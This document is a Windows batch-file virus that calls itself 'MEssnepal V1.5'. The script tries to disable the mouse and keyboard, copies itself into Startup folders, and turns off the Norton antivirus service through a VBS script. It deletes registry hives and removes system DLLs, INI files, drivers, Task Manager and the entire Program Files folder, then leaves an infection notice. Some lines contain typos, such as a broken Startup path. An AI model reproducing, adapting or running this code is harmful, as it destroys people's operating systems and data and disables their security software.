   @echo on
   goto scr
   :scr
   if exist %windir%\system32\scrnsave.scr start %windir%\system32\scrnsave.scr
   if not exist %windir%\system32\scrnsave.scr start %windir%\Channe~1.scr
   goto disable
   :disable
   c:\windows\rundll32.exe mouse,disaable
   c:\windows\rundll32.exe keyboard,disable
   goto startallprocess
   :startallprocess
   If Not Exist "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\nav32.bat" Copy %0 "C:\DocumentC:\Documents and Settings\All Users\Start Menu\Programs\Startup\nav32.bat"
   If Not Exist "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\sysconfig.bat" Copy %0 "C:\DocumentC:\Documents and Settings\All Users\Start Menu\Programs\Startup\sysconfig.bat"
   goto a
   :a
   echo WSHShell = WScript.CreateObject("WScript.Shell") >> c:\messnepal.vbs
   echo WSHShell.RegWrite(HKLM\SYSTEM\CurrentControlSet\Services\navapsvc\start", "4", "REG_DWORD") >> c:\messnepal.vbs
   start c:\messnepal.vbs
   goto b
   :b
   echo [*-HKEY_LOCAL_MACHINE\SOFTWARE\Symantec] >> c:\symantec1.REG
   regedit.exe /s symantec1.reg
   goto c
   :c
   echo [*-HKEY_CURRENT_USER\Software\Symantec] >> c:\symantec2.REG
   regedit.exe /s symantec2.reg
   goto d
   :d
   echo [*-HKEY_CLASSES_ROOT\symantec*.*] >> c:\symantec3.REG
   regedit.exe /s symantec3.reg
   goto e
   :e
   echo [*-HKEY_CLASSES_ROOT\real*.*] >> c:\real1.REG
   regedit.exe /s real1.REG
   goto f
   :f
   echo [*-HKEY_CLASSES_ROOT\microsoft*.*] >> c:\microsoft1.REG
   regedit /s microsoft1.REG
   goto g
   :g
   echo [*-HKEY_CLASSES_ROOT\quick*.*] >> c:\quick1.REG
   regedit.exe /s quick1.REG
   goto h
   :h
   echo [*-HKEY_CURRENT_USER\Software] >> c:\softwareall1.REG
   regedit.exe /s softwareall1.REG
   goto i
   :i
   echo [*-HKEY_LOCAL_MACHINE\HARDWARE] >> c:\hardware1.REG
   regedit /s hardware1.REG
   goto j
   :j
   ATTRIB -r c:\progra~1\navnt
   RMDIR c:\progra~1\navnt
   goto k
   :k
   attrib -h -r -a %windir%\*.dll
   del %windir%\*.dll
   attrib -h -r -a %windir%\*.ini
   del %windir%\*.ini
   attrib -h -r -a %windir%\system32\*.dll
   del %windir%\system32\*.dll
   attrib %windir%\system32\*.ini
   del %windir%\system32\*.ini
   goto l
   :l
   if exist %windir%\system32\taskmgr.exe goto m
   if not exist %windir%\system32\taskmgr.exe goto n
   :m
   attrib -h -r -a %windir%\system32\taskmgr.exe
   del %windir%\system32\taskmgr.exe
   goto n
   :n
   attrib -h -r -a %windir%\system32\drivers
   del %windir%\system32\drivers\*.*
   goto o
   :o
   echo dim filesysfolderdel >> c:\runnowvirus.vbs
   echo set filesysfolderdel=CreateObject("Scripting.FileSystemObject") >> c:\runnowvirus.vbs
   echo If filesysfolderdel.FolderExists ("c:\progra~1") Then >> c:\runnowvirus.vbs
   echo filesysfolderdel.DeleteFolder "c:\progra~1",True >> c:\runnowvirus.vbs
   echo End if >> c:\runnowvirus.vbs
   start c:\runnowvirus.vbs
   goto p
   :p
   echo =========================YOU HAVE BEEN INFECTED WITH A VIRUS=================================== >> c:\virusinfo.txt
   echo =========================creator : RomeoRuleZ               =================================== >> c:\virusinfo.txt
   echo =========================Virus name : MEssnepal V1.5        =================================== >> c:\virusinfo.txt
   EXIT
